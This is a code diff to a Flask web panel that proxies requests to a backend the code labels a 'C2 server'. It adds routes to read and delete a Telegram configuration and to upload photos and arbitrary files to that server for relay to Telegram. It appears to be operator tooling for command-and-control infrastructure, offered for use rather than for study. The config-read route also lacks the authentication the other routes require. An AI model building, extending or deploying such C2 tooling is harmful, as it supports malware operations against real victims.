@@ -257,6 +257,26 @@ def clear_logs():
         return jsonify({"error": str(e)}), 500
 
 
+@app.route("/api/telegram/config", methods=["GET"])
+def telegram_get_config():
+    return _proxy_get("/telegram_config")
+
+
+@app.route("/api/telegram/config", methods=["DELETE"])
+@require_auth
+def telegram_delete_config():
+    try:
+        r = requests.delete(
+            f"{C2_SERVER_URL}/telegram_config",
+            headers=C2_AUTH, timeout=5,
+        )
+        return jsonify(r.json()), r.status_code
+    except requests.exceptions.ConnectionError:
+        return jsonify({"error": "C2 server offline"}), 503
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
 @app.route("/api/telegram/send", methods=["POST"])
 @require_auth
 def telegram_send():
@@ -267,6 +287,48 @@ def telegram_send():
 @require_auth
 def update_telegram_settings():
     return _proxy_post("/update_telegram_settings")
+
+
+@app.route("/api/telegram/send_photo", methods=["POST"])
+@require_auth
+def telegram_send_photo():
+    try:
+        if 'photo' not in request.files:
+            return jsonify({"error": "No photo provided"}), 400
+        f = request.files['photo']
+        headers = {"X-API-Key": C2_API_KEY}
+        r = requests.post(
+            f"{C2_SERVER_URL}/send_photo_to_telegram",
+            files={"photo": (f.filename, f.read(), f.content_type or "image/jpeg")},
+            headers=headers,
+            timeout=30,
+        )
+        return jsonify(r.json()), r.status_code
+    except requests.exceptions.ConnectionError:
+        return jsonify({"error": "C2 server offline"}), 503
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/api/telegram/send_file", methods=["POST"])
+@require_auth
+def telegram_send_file():
+    try:
+        if 'file' not in request.files:
+            return jsonify({"error": "No file provided"}), 400
+        f = request.files['file']
+        headers = {"X-API-Key": C2_API_KEY}
+        r = requests.post(
+            f"{C2_SERVER_URL}/send_file_to_telegram",
+            files={"file": (f.filename, f.read(), f.content_type or "application/octet-stream")},
+            headers=headers,
+            timeout=30,
+        )
+        return jsonify(r.json()), r.status_code
+    except requests.exceptions.ConnectionError:
+        return jsonify({"error": "C2 server offline"}), 503
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 
 # ── Entry point ──────────────────────────────────────────────────────────
